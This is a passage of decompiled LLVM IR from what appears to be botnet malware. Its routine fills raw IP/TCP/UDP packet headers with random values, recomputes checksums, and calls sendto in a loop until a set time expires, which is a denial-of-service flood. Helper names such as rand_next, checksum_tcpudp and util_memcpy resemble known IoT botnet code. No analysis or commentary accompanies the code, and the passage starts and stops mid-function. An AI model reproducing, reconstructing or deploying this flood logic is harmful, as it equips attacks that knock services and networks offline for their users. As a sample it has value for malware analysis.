  %v2_db68 = phi i32 [ %v5_db20, %.dec_label_pc_db68_crit_edge ], [ %v2_db68.pre, %dec_label_pc_db68.loopexit ]
  %v3_db68 = inttoptr i32 %v2_db68 to i8*
  store i8 %v0_db68.pre.sink.off0, i8* %v3_db68, align 1
  %v3_db6c = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_db74 = add i32 %v3_db6c, 1
  store i32 %v1_db74, i32* @r5, align 4
  store i32 %v2_d920, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_db80 = load i32, i32* @r4, align 4
  %v2_db80 = add i32 %v0_db80, %v2_d920
  store i32 %v2_db80, i32* %r2.global-to-local, align 4
  %v9_db84 = icmp eq i32 %v1_db74, %arg2
  store i1 %v9_db84, i1* %cpsr_z.global-to-local, align 1
  %v3_db88 = add i32 %v2_db80, 4
  %v4_db88 = inttoptr i32 %v3_db88 to i16*
  store i16 256, i16* %v4_db88, align 2
  %v0_db8c = load i32, i32* @lr, align 4
  %v1_db8c = trunc i32 %v0_db8c to i16
  %v2_db8c = load i32, i32* %r2.global-to-local, align 4
  %v3_db8c = add i32 %v2_db8c, 2
  %v4_db8c = inttoptr i32 %v3_db8c to i16*
  store i16 %v1_db8c, i16* %v4_db8c, align 2
  %v0_db90 = load i32, i32* @r5, align 4
  store i32 %v0_db90, i32* %stack_var_-44, align 4
  %v8_db94 = icmp slt i32 %v1_db74, %arg2
  br i1 %v8_db94, label %dec_label_pc_da48, label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db68, %dec_label_pc_dd0c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 %v2_d9a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d9a8, label %dec_label_pc_dd0c, label %dec_label_pc_dbac

dec_label_pc_dbac:                                ; preds = %dec_label_pc_db98
  store i32 %v2_d920, i32* %r1.global-to-local, align 4
  %v1_dbb0 = load i32, i32* @sl, align 4
  %v2_dbb0 = add i32 %v1_dbb0, %v2_d920
  store i32 %v2_dbb0, i32* %r3.global-to-local, align 4
  %v1_dbb4 = add i32 %v2_dbb0, 47
  store i32 %v1_dbb4, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_dbbc = add i32 %v2_dbb0, 27
  store i32 %v1_dbbc, i32* @sb, align 4
  %v3_dc98 = icmp eq i32 %v3_d998, 65535
  %v3_dbc8 = icmp eq i32 %v3_d99c, 65535
  br label %dec_label_pc_dc84

dec_label_pc_dbc4:                                ; preds = %dec_label_pc_dc84
  store i32 %v3_d99c, i32* %ip.global-to-local, align 4
  store i1 %v3_dbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_dbc8, label %dec_label_pc_dcc0, label %dec_label_pc_dbd0

dec_label_pc_dbd0:                                ; preds = %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge, %dec_label_pc_dbc4
  %v1_dbd4 = phi i32 [ %v1_dbd4.pre, %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge ], [ 65535, %dec_label_pc_dbc4 ]
  store i32 %v3_d9a0, i32* @lr, align 4
  %v9_dbd4 = icmp eq i32 %v3_d9a0, %v1_dbd4
  store i1 %v9_dbd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbd4, label %dec_label_pc_dcd4, label %dec_label_pc_dbdc

dec_label_pc_dbdc:                                ; preds = %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge, %dec_label_pc_dbd0
  %v1_dbe0 = phi i32 [ %v1_dbe0.pre, %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge ], [ %v1_dbd4, %dec_label_pc_dbd0 ]
  store i32 %v3_d9a4, i32* %r0.global-to-local, align 4
  %v9_dbe0 = icmp eq i32 %v3_d9a4, %v1_dbe0
  store i1 %v9_dbe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbe0, label %dec_label_pc_dce8, label %dec_label_pc_dbe8

dec_label_pc_dbe8:                                ; preds = %dec_label_pc_dcd4, %dec_label_pc_dbdc, %dec_label_pc_dce8
  %v0_dbe8 = load i32, i32* @r7, align 4
  store i32 %v0_dbe8, i32* %r0.global-to-local, align 4
  %v0_dbec = load i32, i32* @sl, align 4
  store i32 %v0_dbec, i32* %r1.global-to-local, align 4
  %v2_dbf0 = call i32 @rand_alphastr(i32 %v0_dbe8, i32 %v0_dbec)
  %v0_dbf4 = load i32, i32* @r8, align 4
  %v1_dbf4 = trunc i32 %v0_dbf4 to i8
  %v2_dbf4 = load i32, i32* @r7, align 4
  %v3_dbf4 = load i32, i32* @sl, align 4
  %v4_dbf4 = add i32 %v3_dbf4, %v2_dbf4
  %v5_dbf4 = inttoptr i32 %v4_dbf4 to i8*
  store i8 %v1_dbf4, i8* %v5_dbf4, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_dbfc = load i32, i32* @r8, align 4
  %v1_dbfc = trunc i32 %v0_dbfc to i16
  %v2_dbfc = load i32, i32* @r4, align 4
  %v3_dbfc = add i32 %v2_dbfc, 10
  %v4_dbfc = inttoptr i32 %v3_dbfc to i16*
  store i16 %v1_dbfc, i16* %v4_dbfc, align 2
  %v0_dc00 = load i32, i32* @r4, align 4
  store i32 %v0_dc00, i32* @r0, align 4
  %v2_dc04 = call i32 @checksum_generic(i32 %v0_dc00, i32 20)
  %v3_dc04 = trunc i32 %v2_dc04 to i16
  store i32 %v2_dc04, i32* %r0.global-to-local, align 4
  %v3_dc08 = load i32, i32* @r4, align 4
  %v4_dc08 = add i32 %v3_dc08, 10
  %v5_dc08 = inttoptr i32 %v4_dc08 to i16*
  store i16 %v3_dc04, i16* %v5_dc08, align 2
  %v0_dc0c = load i32, i32* @r6, align 4
  store i32 %v0_dc0c, i32* @r1, align 4
  %v1_dc10 = add i32 %v0_dc0c, 4
  %v2_dc10 = inttoptr i32 %v1_dc10 to i16*
  %v3_dc10 = load i16, i16* %v2_dc10, align 2
  %v4_dc10 = zext i16 %v3_dc10 to i32
  store i32 %v4_dc10, i32* %r2.global-to-local, align 4
  %v0_dc14 = load i32, i32* @r8, align 4
  %v1_dc14 = trunc i32 %v0_dc14 to i16
  %v3_dc14 = add i32 %v0_dc0c, 6
  %v4_dc14 = inttoptr i32 %v3_dc14 to i16*
  store i16 %v1_dc14, i16* %v4_dc14, align 2
  %v0_dc18 = load i32, i32* @sb, align 4
  store i32 %v0_dc18, i32* %r3.global-to-local, align 4
  %v0_dc1c = load i32, i32* @r4, align 4
  store i32 %v0_dc1c, i32* %r0.global-to-local, align 4
  %v4_dc20 = call i32 @checksum_tcpudp(i32 %v0_dc1c, i32 %v0_dc0c, i32 %v4_dc10, i32 %v0_dc18)
  %v5_dc20 = trunc i32 %v4_dc20 to i16
  store i32 %v4_dc20, i32* %r0.global-to-local, align 4
  %v3_dc24 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dc24, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_dc2c = mul i32 %v3_dc24, 32
  store i32 %v3_dc2c, i32* %ip.global-to-local, align 4
  %v3_dc30 = load i32, i32* @r6, align 4
  %v4_dc30 = add i32 %v3_dc30, 6
  %v5_dc30 = inttoptr i32 %v4_dc30 to i16*
  store i16 %v5_dc20, i16* %v5_dc30, align 2
  store i32 %stack_var_-2184.0, i32* %r2.global-to-local, align 4
  %v0_dc38 = load i32, i32* @r6, align 4
  %v1_dc38 = add i32 %v0_dc38, 2
  %v2_dc38 = inttoptr i32 %v1_dc38 to i16*
  %v3_dc38 = load i16, i16* %v2_dc38, align 2
  %v4_dc38 = zext i16 %v3_dc38 to i32
  store i32 %v4_dc38, i32* @r6, align 4
  %v0_dc3c = load i32, i32* %ip.global-to-local, align 4
  %v1_dc3c = load i32, i32* %r3.global-to-local, align 4
  %tmp135 = mul i32 %v1_dc3c, -8
  %v5_dc3c = add i32 %v0_dc3c, %tmp135
  %v1_dc40 = load i32, i32* %r1.global-to-local, align 4
  %v2_dc40 = add i32 %v1_dc40, %v5_dc3c
  store i32 %v2_dc40, i32* %ip.global-to-local, align 4
  %v2_dc44 = add i32 %v2_dc40, 4
  %v3_dc44 = inttoptr i32 %v2_dc44 to i32*
  store i32 %stack_var_-2184.0, i32* %v3_dc44, align 4
  %v0_dc48 = load i32, i32* @r6, align 4
  %v1_dc48 = trunc i32 %v0_dc48 to i16
  %v2_dc48 = load i32, i32* %ip.global-to-local, align 4
  %v3_dc48 = add i32 %v2_dc48, 2
  %v4_dc48 = inttoptr i32 %v3_dc48 to i16*
  store i16 %v1_dc48, i16* %v4_dc48, align 2
  %v0_dc4c = load i32, i32* @r4, align 4
  store i32 %v0_dc4c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v0_dc58 = load i32, i32* @fp, align 4
  store i32 %v0_dc58, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_dc60 = load i32, i32* %ip.global-to-local, align 4
  %v6_dc68 = call i32 @__libc_sendto(i32 %v3_d934, i32 %v0_dc4c, i32 %v0_dc58, i32 16384, i32 %v0_dc60, i32 16)
  %v3_dc6c = load i32, i32* %stack_var_-44, align 4
  %v1_dc70 = add i32 %v3_dc6c, 1
  store i32 %v1_dc70, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_dc78 = icmp eq i32 %v1_dc70, %arg2
  store i1 %v9_dc78, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_dc70, i32* %stack_var_-44, align 4
  %v7_dc80 = icmp slt i32 %v1_dc70, %arg2
  br i1 %v7_dc80, label %dec_label_pc_dc84, label %dec_label_pc_dd0c

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dbe8, %dec_label_pc_dbac
  %v1_dc90 = phi i32 [ %v1_dc70, %dec_label_pc_dbe8 ], [ 0, %dec_label_pc_dbac ]
  store i32 %v2_d6e4, i32* %r2.global-to-local, align 4
  store i32 %v3_d998, i32* %r3.global-to-local, align 4
  %v4_dc90 = mul i32 %v1_dc90, 4
  %v5_dc90 = add i32 %v4_dc90, %v2_d6e4
  %v6_dc90 = inttoptr i32 %v5_dc90 to i32*
  %v7_dc90 = load i32, i32* %v6_dc90, align 4
  store i32 %v7_dc90, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_dc98, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* @r8, align 4
  %v1_dca0 = add i32 %v7_dc90, 20
  store i32 %v1_dca0, i32* @r6, align 4
  %v1_dca4 = add i32 %v7_dc90, 41
  store i32 %v1_dca4, i32* @r7, align 4
  br i1 %v3_dc98, label %dec_label_pc_dcac, label %dec_label_pc_dbc4

dec_label_pc_dcac:                                ; preds = %dec_label_pc_dc84
  %v0_dcac = call i32 @rand_next()
  %v1_dcac = trunc i32 %v0_dcac to i16
  store i32 %v0_dcac, i32* %r0.global-to-local, align 4
  store i32 %v3_d99c, i32* %ip.global-to-local, align 4
  %v1_dcb4 = load i32, i32* @r5, align 4
  %v9_dcb4 = icmp eq i32 %v3_d99c, %v1_dcb4
  store i1 %v9_dcb4, i1* %cpsr_z.global-to-local, align 1
  %v3_dcb8 = load i32, i32* @r4, align 4
  %v4_dcb8 = add i32 %v3_dcb8, 4
  %v5_dcb8 = inttoptr i32 %v4_dcb8 to i16*
  store i16 %v1_dcac, i16* %v5_dcb8, align 2
  br i1 %v9_dcb4, label %dec_label_pc_dcc0, label %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge

dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge:    ; preds = %dec_label_pc_dcac
  %v1_dbd4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dbd0

dec_label_pc_dcc0:                                ; preds = %dec_label_pc_dcac, %dec_label_pc_dbc4
  %v0_dcc0 = call i32 @rand_next()
  %v1_dcc0 = trunc i32 %v0_dcc0 to i16
  store i32 %v0_dcc0, i32* %r0.global-to-local, align 4
  store i32 %v3_d9a0, i32* @lr, align 4
  %v1_dcc8 = load i32, i32* @r5, align 4
  %v9_dcc8 = icmp eq i32 %v3_d9a0, %v1_dcc8
  store i1 %v9_dcc8, i1* %cpsr_z.global-to-local, align 1
  %v3_dccc = load i32, i32* @r4, align 4
  %v4_dccc = add i32 %v3_dccc, 20
  %v5_dccc = inttoptr i32 %v4_dccc to i16*
  store i16 %v1_dcc0, i16* %v5_dccc, align 2
  br i1 %v9_dcc8, label %dec_label_pc_dcd4, label %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge

dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge:    ; preds = %dec_label_pc_dcc0
  %v1_dbe0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dbdc

dec_label_pc_dcd4:                                ; preds = %dec_label_pc_dcc0, %dec_label_pc_dbd0
  %v0_dcd4 = call i32 @rand_next()
  %v1_dcd4 = trunc i32 %v0_dcd4 to i16
  %v3_dcd8 = load i32, i32* @r6, align 4
  %v4_dcd8 = add i32 %v3_dcd8, 2
  %v5_dcd8 = inttoptr i32 %v4_dcd8 to i16*
  store i16 %v1_dcd4, i16* %v5_dcd8, align 2
  store i32 %v3_d9a4, i32* %r0.global-to-local, align 4
  %v1_dce0 = load i32, i32* @r5, align 4
  %v9_dce0 = icmp eq i32 %v3_d9a4, %v1_dce0
  store i1 %v9_dce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dce0, label %dec_label_pc_dce8, label %dec_label_pc_dbe8

dec_label_pc_dce8:                                ; preds = %dec_label_pc_dcd4, %dec_label_pc_dbdc
  %v0_dce8 = call i32 @rand_next()
  %v1_dce8 = trunc i32 %v0_dce8 to i16
  store i32 %v0_dce8, i32* %r0.global-to-local, align 4
  %v3_dcec = load i32, i32* @r4, align 4
  %v4_dcec = add i32 %v3_dcec, 28
  %v5_dcec = inttoptr i32 %v4_dcec to i16*
  store i16 %v1_dce8, i16* %v5_dcec, align 2
  br label %dec_label_pc_dbe8

dec_label_pc_dcf4:                                ; preds = %dec_label_pc_d944
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v1_dcf8 = call i32 @__GI___libc_close(i32 %v3_d934)
  store i32 %v1_dcf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dcfc

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dd0c, %dec_label_pc_d91c, %dec_label_pc_d904, %dec_label_pc_dcf4
  %v1_dd08 = phi i32 [ %v3_d934, %dec_label_pc_d91c ], [ %v2_d910, %dec_label_pc_d904 ], [ %v1_dcf8, %dec_label_pc_dcf4 ], [ %v2_dd10, %dec_label_pc_dd0c ]
  store i32 %v18_d6b4, i32* %sb.global-to-local, align 4
  store i32 %v27_d6b4, i32* %lr.global-to-local, align 4
  ret i32 %v1_dd08

dec_label_pc_dd0c.critedge:                       ; preds = %dec_label_pc_d96c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_dd0c

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_dbe8, %dec_label_pc_dd0c.critedge, %dec_label_pc_db98
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_dd10 = call i32 @__GI_time(i32* null)
  store i32 %v2_dd10, i32* %r0.global-to-local, align 4
  %v9_dd18 = icmp eq i32 %v2_d910, %v2_dd10
  store i1 %v9_dd18, i1* %cpsr_z.global-to-local, align 1
  %v6_dd1c = icmp slt i32 %v2_d910, %v2_dd10
  br i1 %v6_dd1c, label %dec_label_pc_dcfc, label %dec_label_pc_db98

dec_label_pc_dd24:                                ; preds = %dec_label_pc_d8bc, %bb113
  %v0_d8c4.lcssa = phi i32 [ %v1_d890, %dec_label_pc_d8bc ], [ %v0_d8c4, %bb113 ]
  %v2_dd28 = sub i32 %v0_d8c4.lcssa, %v0_d86c
  store i32 %v2_dd28, i32* @r4, align 4
  %v2_dd2c = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_d880, i32* %r1.global-to-local, align 4
  store i32 %v2_dd2c, i32* %r0.global-to-local, align 4
  store i32 %v2_dd28, i32* %r2.global-to-local, align 4
  %v3_dd3c = call i32 @util_memcpy(i32 %v2_dd2c, i32 %v2_d880, i32 %v2_dd28)
  %v2_dd40 = ptrtoint i32* %stack_var_-40 to i32
  %v1_dd44 = load i32, i32* @r4, align 4
  %v2_dd44 = add i32 %v1_dd44, %v2_dd40
  store i32 %v2_dd44, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_dd2c, i32* @r0, align 4
  %v3_dd50 = add i32 %v2_dd44, -36
  %v4_dd50 = inttoptr i32 %v3_dd50 to i8*
  store i8 0, i8* %v4_dd50, align 1
  %v1_dd54 = call i32 @inet_addr(i32 %v2_dd2c)
  store i32 %v1_dd54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd60:                                ; preds = %dec_label_pc_d8d0
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd70:                                ; preds = %dec_label_pc_d8d0
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd84:                                ; preds = %dec_label_pc_d8d0
  store i32 707416650, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d904

; uselistorder directives
  uselistorder i32 %v1_dd54, { 1, 0 }
  uselistorder i32 %v2_dd2c, { 0, 1, 3, 2 }
  uselistorder i32 %v2_dd28, { 1, 0, 2 }
  uselistorder i32 %v2_dd10, { 1, 2, 3, 0 }
  uselistorder i32 %v0_dce8, { 1, 0 }
  uselistorder i32 %v0_dcc0, { 1, 0 }
  uselistorder i32 %v0_dcac, { 1, 0 }
  uselistorder i32 %v7_dc90, { 1, 0, 2 }
  uselistorder i32 %v1_dc70, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_dc20, { 1, 0 }
  uselistorder i32 %v0_dc0c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_dc04, { 1, 0 }
  uselistorder i1 %v3_dbc8, { 1, 0 }
  uselistorder i1 %v3_dc98, { 1, 0 }
  uselistorder i32 %v1_db50.pre, { 1, 0 }
  uselistorder i32 %v2_db48, { 1, 0 }
  uselistorder i32 %v2_db4817, { 1, 0 }
  uselistorder i32 %v0_db5419, { 1, 0 }
  uselistorder i32 %v1_db40, { 1, 0 }
  uselistorder i32 %v3_da2c, { 1, 0 }
  uselistorder i32 %v3_da18, { 1, 0 }
  uselistorder i32 %v3_d9d8, { 1, 0 }
  uselistorder i32 %v1_d9ac, { 1, 0 }
  uselistorder i32 %v3_d9a0, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_d99c, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_d964, { 1, 0 }
  uselistorder i1 %v7_d938, { 1, 0 }
  uselistorder i32 %v3_d934, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_d920, { 0, 13, 1, 8, 3, 6, 7, 5, 9, 11, 10, 4, 12, 2 }
  uselistorder i32 %v2_d910, { 2, 1, 0, 3 }
  uselistorder i32 %v0_d90c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-2184.0, { 0, 3, 2, 1 }
  uselistorder i32 %v1_d8d4, { 1, 0 }
  uselistorder i32 %v0_d8d0, { 1, 0 }
  uselistorder i32 %v1_d8c4, { 1, 2, 0 }
  uselistorder i1 %v7_d8b0, { 1, 0 }
  uselistorder i32 %v1_d8ac, { 1, 0, 2 }
  uselistorder i1 %v8_d8a4, { 1, 0 }
  uselistorder i1 %v7_d8a0, { 1, 0 }
  uselistorder i32 %v1_d894, { 1, 0 }
  uselistorder i8 %v2_d888, { 2, 0, 1, 3 }
  uselistorder i32 %v0_d88c, { 1, 0 }
  uselistorder i32 %v0_d8ac, { 1, 2, 3, 0 }
  uselistorder i32 %v2_d880, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d87c, { 1, 0, 2 }
  uselistorder i32 %v0_d874, { 1, 0, 2, 3 }
  uselistorder i1 %v7_d86c, { 1, 0 }
  uselistorder i32 %v0_d86c, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_d810, { 1, 0, 2, 3 }
  uselistorder i32 %v6_d7b0, { 2, 0, 1, 3 }
  uselistorder i32 %v6_d794, { 0, 2, 1 }
  uselistorder i32 %v6_d77c, { 1, 0, 2 }
  uselistorder i32 %v1_d764, { 1, 0 }
  uselistorder i32 %v7_d720, { 1, 0, 2 }
  uselistorder i32 %v1_d708, { 1, 0 }
  uselistorder i32 %v6_d6fc, { 1, 0 }
  uselistorder i32 %v2_d6e4, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 2, 10, 7, 8, 9, 11, 12, 13, 3, 14, 4, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 4, 5, 6, 7, 8, 9, 10, 2, 13, 3, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 45, 44, 46, 48, 47, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 8, 6, 9, 7, 10, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 22, 21, 23, 24, 25, 33, 26, 27, 28, 29, 30, 31, 32, 37, 34, 35, 36, 38, 40, 39, 42, 41, 43, 44, 45, 47, 46, 48, 49, 51, 50, 52, 54, 53, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 1, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 41, { 4, 5, 6, 0, 1, 7, 2, 8, 3, 9 }
  uselistorder i8 17, { 1, 2, 0 }
  uselistorder i8 -16, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 37, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 53, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %arg2, { 3, 4, 6, 7, 0, 1, 5, 2, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_dd0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dcfc, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_dbe8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_db98, { 1, 0 }
  uselistorder label %dec_label_pc_db68, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %dec_label_pc_d8c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d8bc, { 1, 0 }
  uselistorder label %dec_label_pc_d8b0, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_ddbc, label %dec_label_pc_dda4

dec_label_pc_dda4:                                ; preds = %entry
  %v0_ddac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_dda8

dec_label_pc_dda8:                                ; preds = %dec_label_pc_dda8, %dec_label_pc_dda4
  %v0_ddb4 = phi i32 [ %v2_ddb4, %dec_label_pc_dda8 ], [ 0, %dec_label_pc_dda4 ]
  %v0_ddac = phi i32 [ %v5_ddac, %dec_label_pc_dda8 ], [ %v0_ddac.pre, %dec_label_pc_dda4 ]
  %v0_dda8 = phi i32 [ %v1_dda8, %dec_label_pc_dda8 ], [ %arg1, %dec_label_pc_dda4 ]
  %v1_dda8 = add i32 %v0_dda8, -2
  %v1_ddac = inttoptr i32 %v0_ddac to i16*
  %v2_ddac = load i16, i16* %v1_ddac, align 2
  %v3_ddac = zext i16 %v2_ddac to i32
  %v5_ddac = add i32 %v0_ddac, -2
  store i32 %v5_ddac, i32* @r0, align 4
  %v2_ddb4 = add i32 %v3_ddac, %v0_ddb4
  %v1_dda8.cmp = icmp ugt i32 %v1_dda8, 1
  br i1 %v1_dda8.cmp, label %dec_label_pc_dda8, label %dec_label_pc_ddbc.loopexit

dec_label_pc_ddbc.loopexit:                       ; preds = %dec_label_pc_dda8
  br label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %entry, %dec_label_pc_ddbc.loopexit
  %v1_ddc4 = phi i32 [ %v2_ddb4, %dec_label_pc_ddbc.loopexit ], [ 0, %entry ]
  %v0_ddbc = phi i32 [ %v1_dda8, %dec_label_pc_ddbc.loopexit ], [ %arg1, %entry ]
  %v7_ddbc = icmp eq i32 %v0_ddbc, 1
  br i1 %v7_ddbc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_ddbc
  %v1_ddc0 = load i32, i32* @r0, align 4
  %v2_ddc0 = inttoptr i32 %v1_ddc0 to i8*
  %v3_ddc0 = load i8, i8* %v2_ddc0, align 1
  %v4_ddc0 = zext i8 %v3_ddc0 to i32
  %v3_ddc4 = add i32 %v1_ddc4, %v4_ddc0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ddbc, %bb
  %v0_ddc8 = phi i32 [ %v1_ddc4, %dec_label_pc_ddbc ], [ %v3_ddc4, %bb ]
  %v3_ddcc = urem i32 %v0_ddc8, 65536
  %v4_ddd0 = udiv i32 %v0_ddc8, 65536
  %v5_ddd0 = add nuw nsw i32 %v4_ddd0, %v3_ddcc
  %v4_ddd4 = udiv i32 %v5_ddd0, 65536
  %v5_ddd4 = add nuw nsw i32 %v4_ddd4, %v5_ddd0
  %v1_ddd8 = urem i32 %v5_ddd4, 65536
  %v3_dde0 = xor i32 %v1_ddd8, 65535
  ret i32 %v3_dde0

; uselistorder directives
  uselistorder i32 %v5_ddd0, { 1, 0 }
  uselistorder i32 %v5_ddac, { 1, 0 }
  uselistorder i32 %v1_dda8, { 1, 0, 2 }
  uselistorder i32 %v0_ddac, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_ddbc, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_ddf8 = add i32 %arg1, 12
  %v2_ddf8 = inttoptr i32 %v1_ddf8 to i32*
  %v3_ddf8 = load i32, i32* %v2_ddf8, align 4
  %v1_ddfc = add i32 %arg1, 16
  %v2_ddfc = inttoptr i32 %v1_ddfc to i32*
  %v3_ddfc = load i32, i32* %v2_ddfc, align 4
  %v7_de00 = icmp sgt i32 %arg3, 1
  br i1 %v7_de00, label %dec_label_pc_de0c.preheader, label %dec_label_pc_de20

dec_label_pc_de0c.preheader:                      ; preds = %entry
  %v0_de10.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_de0c

dec_label_pc_de0c:                                ; preds = %dec_label_pc_de0c.preheader, %dec_label_pc_de0c
  %v0_de18 = phi i32 [ 0, %dec_label_pc_de0c.preheader ], [ %v2_de18, %dec_label_pc_de0c ]
  %v0_de10 = phi i32 [ %v0_de10.pre, %dec_label_pc_de0c.preheader ], [ %v5_de10, %dec_label_pc_de0c ]
  %v0_de0c = phi i32 [ %arg3, %dec_label_pc_de0c.preheader ], [ %v1_de0c, %dec_label_pc_de0c ]
  %v1_de0c = add nsw i32 %v0_de0c, -2
  %v1_de10 = inttoptr i32 %v0_de10 to i16*
  %v2_de10 = load i16, i16* %v1_de10, align 2
  %v3_de10 = zext i16 %v2_de10 to i32
  %v5_de10 = add i32 %v0_de10, -2
  store i32 %v5_de10, i32* @r1, align 4
  %v2_de18 = add i32 %v3_de10, %v0_de18
  %v8_de1c = icmp sgt i32 %v1_de0c, 1
  br i1 %v8_de1c, label %dec_label_pc_de0c, label %dec_label_pc_de20.loopexit

dec_label_pc_de20.loopexit:                       ; preds = %dec_label_pc_de0c
  br label %dec_label_pc_de20

dec_label_pc_de20:                                ; preds = %dec_label_pc_de20.loopexit, %entry
  %v1_de2c = phi i32 [ %v2_de18, %dec_label_pc_de20.loopexit ], [ 0, %entry ]
  %v0_de20 = phi i32 [ %v1_de0c, %dec_label_pc_de20.loopexit ], [ %arg3, %entry ]
  %v7_de20 = icmp eq i32 %v0_de20, 1
  br i1 %v7_de20, label %bb, label %.thread

